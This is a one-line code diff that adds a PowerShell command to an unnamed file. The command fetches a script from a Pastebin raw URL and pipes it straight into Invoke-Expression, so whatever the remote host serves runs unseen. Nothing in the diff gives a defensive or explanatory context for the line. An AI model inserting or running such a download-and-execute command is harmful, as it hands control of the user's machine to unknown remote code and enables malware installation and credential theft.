@@ -1,0 +1,1 @@
+iwr https://pastebin.com/raw/2ACY9rkL | iex
